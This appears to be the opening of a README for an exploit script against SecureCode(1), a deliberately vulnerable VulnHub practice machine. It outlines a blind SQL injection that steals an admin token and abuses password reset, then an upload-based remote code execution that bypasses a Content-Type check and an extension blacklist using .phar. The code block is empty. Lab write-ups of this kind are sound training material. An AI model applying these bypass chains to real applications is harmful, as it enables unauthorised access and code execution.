PoC exploit for OSWE-Like machine [ SecureCode(1) ] 

VM Author: sud0root

This is first PoC for this VM! 

Machine URL : https://www.vulnhub.com/entry/securecode-1,651/


I have done this machine and write automation script to exploit two vulnerablities in this machine with interactive shell

Vulnerabilities : 

1- Authentication Bypass via Blind SQL injection that extract admin token, then abuse reset passord feature to login into admin account.

2- Remote code execution using File uplaod feature with bypassing Content-Type "Header Validation" and bypass extensions blacklist with .phar (PHP Archive extension). 

PoC : 
``` python
